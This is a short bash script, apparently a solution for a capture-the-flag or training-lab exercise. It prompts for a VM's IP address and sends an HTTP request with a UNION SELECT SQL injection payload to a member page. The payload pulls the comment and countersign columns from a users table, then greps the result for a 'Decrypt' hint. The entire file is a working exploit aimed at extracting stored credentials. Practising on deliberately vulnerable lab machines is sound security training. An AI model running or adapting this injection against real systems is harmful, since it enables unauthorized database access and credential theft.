#!/bin/bash

echo input the VM ip address :
read ip

url="http://${ip}/?page=member"

response=$(curl -s -G -d "id=1 UNION SELECT Commentaire, countersign FROM Member_Sql_Injection.users" -d "Submit=Submit" "$url" | grep "Decrypt")
echo "${response}"